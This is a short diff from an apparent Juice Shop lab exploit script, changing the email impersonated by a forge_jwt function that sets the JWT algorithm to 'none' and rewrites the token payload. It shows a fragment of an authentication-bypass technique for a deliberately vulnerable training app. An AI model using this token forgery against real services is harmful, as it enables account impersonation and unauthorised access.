@@ -36,7 +36,7 @@ def forge_jwt(original_token: str) -> str:
         header["alg"] = "none"
         
         # Modify payload
-        payload["data"]["email"] = "rsa_lord@juice-sh.op"
+        payload["data"]["email"] = "jwtn3d@juice-sh.op"
         payload["data"].pop("deletedAt", None)
 
         # Re-encode header and payload
